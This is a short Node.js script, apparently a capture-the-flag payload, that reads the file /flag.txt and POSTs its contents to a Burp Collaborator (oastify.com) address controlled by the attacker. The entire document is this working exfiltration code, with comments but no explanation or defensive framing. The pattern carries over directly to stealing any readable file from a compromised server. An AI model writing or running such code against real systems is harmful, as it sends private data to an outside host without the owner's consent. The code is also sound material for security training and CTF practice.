const fs = require('fs');
const fetch = require('node-fetch');

// Specify the file path
const filePath = '/flag.txt';

// Read the file synchronously
try {
  const fileContent = fs.readFileSync(filePath, 'utf8');

  // Specify your Burp Collaborator URL
  const burpCollabUrl = 'https://1qsqtf0453spyg14a3z2cc0xbohg5et3.oastify.com';

  // Send the file content to Burp Collaborator
  fetch(burpCollabUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ fileContent }),
  })
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => console.error('Error sending data to Burp Collaborator:', error));
} catch (error) {
  console.error('Error reading file:', error);
}
